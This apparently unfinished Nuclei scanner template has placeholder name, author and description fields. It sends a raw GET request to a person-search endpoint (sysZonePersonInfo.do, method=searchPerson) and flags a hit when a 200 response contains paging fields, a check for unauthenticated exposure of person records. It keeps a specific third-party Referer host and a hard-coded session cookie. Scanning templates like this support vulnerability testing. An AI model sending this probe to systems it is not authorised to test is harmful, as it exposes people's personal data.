id: template-id

info:
  name: Template Name
  author: admin
  severity: medium
  description: description
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |+
        GET /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=5&s_ajax=true HTTP/1.1
        Host: {{Hostname}}
        Pragma: no-cache
        Cache-Control: no-cache
        User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5822.196 Safari/537.36
        Accept: */*
        Referer: http://oat.guoyunmall.com:8080/login.jsp
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Cookie: JSESSIONID=F2AF2DF846AC16FDBF415A4DB9FF04A9
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'title'
          - 'property'
          - 'totalSize'
          - 'currentPage'
          - 'col'
        condition: or

      - type: status
        status:
          - 200
